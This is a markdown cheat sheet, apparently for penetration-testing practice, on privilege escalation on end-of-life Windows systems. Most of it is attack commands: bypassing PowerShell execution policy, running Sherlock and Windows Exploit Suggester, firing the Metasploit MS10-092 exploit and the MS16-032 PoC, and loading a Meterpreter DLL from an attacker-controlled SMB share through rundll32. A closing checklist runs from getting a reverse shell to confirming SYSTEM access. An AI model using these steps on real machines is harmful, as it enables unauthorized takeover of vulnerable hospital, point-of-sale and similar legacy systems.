# âœ… Legacy Windows OS Privilege Escalation (Cheat Sheet)

---

## ðŸŽ¯ What to Look for

- [ ] **Identify End-of-Life Systems** (XP, 7, Server 2003, 2008)
- [ ] **Check for Unpatched Exploits (MS10-092, MS16-032, etc.)**
- [ ] **Check Weaknesses Due to Lack of Modern Defenses (No CFG, Credential Guard, etc.)**
- [ ] **Check for Forgotten Systems / Downgrade Weakness**
- [ ] **Look for Custom Apps That Canâ€™t Be Upgraded** (Medical, POS, University Systems)
- [ ] **Enumerate Local PrivEsc Vectors Using Sherlock or WinExploitSuggester**
- [ ] **Verify Patch Level via `wmic qfe`**
- [ ] **Check for Fragility Before Exploiting** (Critical legacy apps)
- [ ] **Use Metasploit for Known Working Exploits**

---
## âœ… Server 2008 Local PrivEsc

```powershell
# Using Sherlock to Find Local PrivEsc
Set-ExecutionPolicy bypass -Scope Process
Import-Module .\Sherlock.ps1
Find-AllVulns

# Check installed hotfixes (patch level)
wmic qfe

# Example of Metasploit Exploit (MS10-092)
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST tun0
set LPORT 4443
exploit

# Deliver Meterpreter using rundll32
rundll32.exe \\\\10.10.14.3\\SHARE\\test.dll,0
```
## âœ… Windows 7 Local PrivEsc

```c
# Export system info
systeminfo > win7.txt

# Use Windows Exploit Suggester
python2.7 windows-exploit-suggester.py --update
python2.7 windows-exploit-suggester.py --database DB.xls --systeminfo win7.txt

# Run MS16-032 PoC
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\\Invoke-MS16-032.ps1
Invoke-MS16-032
```

## âœ… Common Exploits for Legacy OS

- [ ] Get shell (Meterpreter or reverse shell)
- [ ] Use Sherlock or WinExploitSuggester
- [ ] Match CVE to PoC or Metasploit
- [ ] Migrate to x64 process if needed
- [ ] Drop & run exploit binary or PowerShell
- [ ] Confirm NT AUTHORITY\SYSTEM access
